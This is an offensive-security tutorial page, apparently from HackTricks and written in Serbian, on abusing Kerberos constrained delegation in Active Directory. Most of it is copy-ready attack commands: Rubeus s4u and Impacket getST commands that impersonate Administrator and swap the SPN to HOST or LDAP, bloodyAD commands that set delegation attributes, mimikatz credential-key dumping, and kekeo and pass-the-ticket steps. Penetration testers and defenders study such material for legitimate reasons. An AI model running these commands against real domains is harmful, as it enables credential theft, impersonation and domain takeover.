# Ograničeno delegiranje

{{#include ../../banners/hacktricks-training.md}}

## Ograničeno delegiranje

Korišćenjem ovoga Domain admin može **dozvoliti** računaru da **imitira korisnika ili računar** prema bilo kom **servisu** mašine.

- **Service for User to self (_S4U2self_):** Ako **service account** ima vrednost _userAccountControl_ koja u sebi sadrži [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D), onda on može dobiti TGS za sebe (servis) u ime bilo kog drugog korisnika.
- **Service for User to Proxy(_S4U2proxy_):** **Service account** može dobiti TGS u ime bilo kog korisnika za servis naveden u **msDS-AllowedToDelegateTo.** Da bi to uradio, prvo treba TGS od tog korisnika prema sebi, ali može koristiti S4U2self da dobije taj TGS pre nego što zatraži drugi.

**Napomena**: Ako je korisnik označen kao ‘_Account is sensitive and cannot be delegated_’ u AD, **nećete moći da ga imitujete**.

To znači da ako **kompromitujete hash servisa** možete **imitirati korisnike** i dobiti **pristup** u njihovo ime bilo kom **servisu** na navedenim mašinama (mogući **privesc**).

Pored toga, **nećete imati pristup samo servisu koji korisnik može da imituje, već i bilo kom servisu** zato što SPN (ime servisa koje se traži) nije proveravan (u tiket ovoj deo nije enkriptovan/potpisan). Dakle, ako imate pristup **CIFS service** možete takođe imati pristup **HOST service** koristeći `/altservice` flag u Rubeus na primer. Ista SPN zamena slabost se iskorišćava i pomoću **Impacket getST -altservice** i drugih alata.

Takođe, **LDAP service access on DC** je ono što je potrebno da bi se iskoristio **DCSync**.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Cross-domain constrained delegation notes (2025+)

Od **Windows Server 2012/2012 R2** KDC podržava **constrained delegation across domains/forests** putem S4U2Proxy ekstenzija. Moderni buildovi (Windows Server 2016–2025) zadržavaju ovo ponašanje i dodaju dva PAC SID-a koja signaliziraju protocol transition:

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) kada se korisnik normalno autentifikovao.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) kada je servis potvrdio identitet kroz protocol transition.

Očekujte `SERVICE_ASSERTED_IDENTITY` unutar PAC-a kada se protocol transition koristi preko domena, što potvrđuje da je S4U2Proxy korak uspešno završen.

### Impacket / Linux tooling (altservice & full S4U)

Noviji Impacket (0.11.x+) izlaže isti S4U lanac i SPN zamenu kao Rubeus:
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'
```
Ako više volite prvo falsifikovati korisnički ST (npr. samo offline hash), koristite **ticketer.py** zajedno sa **getST.py** за S4U2Proxy. Pogledajte otvoreni Impacket issue #1713 za aktuelne nepravilnosti (KRB_AP_ERR_MODIFIED kada falsifikovani ST ne odgovara SPN key).

### Automatizacija podešavanja delegacije sa low-priv creds

Ako već posedujete **GenericAll/WriteDACL** над računarom ili servisним налогом, можете daljinski podesiti potrebne atribute bez RSAT koristeći **bloodyAD** (2024+):
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
Ovo vam omogućava da izgradite putanju za constrained delegation za privesc bez DA privilegija čim možete menjati te atribute.

- Korak 1: **Nabavite TGT za dozvoljeni servis**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Postoje **drugi načini da se dobije TGT ticket** ili **RC4** ili **AES256** bez toga da budete SYSTEM na računaru, kao što su Printer Bug, unconstrain delegation, NTLM relaying i zloupotreba Active Directory Certificate Service
>
> **Samo posedovanje tog TGT ticket-a (ili hashed) vam omogućava izvođenje ovog napada bez kompromitovanja celog računara.**

- Step2: **Dobij TGS za servis lažno predstavljajući korisnika**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**Više informacija na ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) i [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)

## Reference
- [Kerberos Constrained Delegation Overview (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Impacket issue #1713 – S4U2proxy forged service ticket errors](https://github.com/fortra/impacket/issues/1713)

{{#include ../../banners/hacktricks-training.md}}
